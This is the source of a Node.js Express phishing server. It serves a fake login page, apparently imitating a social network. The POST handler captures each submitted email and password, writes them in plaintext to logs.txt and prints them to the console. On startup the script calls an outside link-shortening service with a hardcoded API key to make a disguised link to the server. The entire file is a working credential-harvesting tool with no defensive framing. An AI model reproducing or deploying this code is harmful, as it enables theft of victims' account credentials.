const express = require('express');
const exphbs = require('express-handlebars'); // Import properly
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const os = require('os');

const port = process.env.PORT || 1111;
const networkInterfaces = os.networkInterfaces();

const app = express();

// Correctly set up Handlebars engine
app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
app.set('view engine', 'handlebars');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use('/images', express.static(path.join(__dirname, 'views/images')));

app.get('/', (req, res) => {
    res.render('f_login');
});

app.post('/_', (req, res) => {
    res.render('f_success');
    const capturedContent = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;

    fs.appendFile('logs.txt', capturedContent, (err) => {
        if (err) {
            console.error(err);
            return;
        }
    });

    console.log(capturedContent);
});

// Serve image files dynamically
const imageFiles = ['eye-off.png', 'eye.png', 'favicon.png', 'logo.png', 'check.png'];
imageFiles.forEach((image) => {
    app.get(`/images/${image}`, (req, res) => {
        res.sendFile(path.join(__dirname, 'views/images', image));
    });
});

app.listen(port, () => {
    console.log(`[!] Server Running on port ${port}`);

    // Get local IP address
    const ethernet = networkInterfaces.Ethernet || networkInterfaces.eth0 || networkInterfaces.en0;
    const ethernetAddress = ethernet ? ethernet.find((iface) => iface.family === 'IPv4' && !iface.internal)?.address : null;

    if (ethernetAddress) {
        const apiUrl = `http://anoni4.cf/api?create&key=D03hVPibJRaxvXqmus8NAE7WC6n2KyfGcwI&link=http://${ethernetAddress}:${port}`;

        axios.get(apiUrl)
            .then((response) => {
                console.log('API Response:', response.data);
            })
            .catch((error) => {
                console.error('API Request Failed:', error.message);
            });
    } else {
        console.error('Ethernet interface is not available.');
    }
});

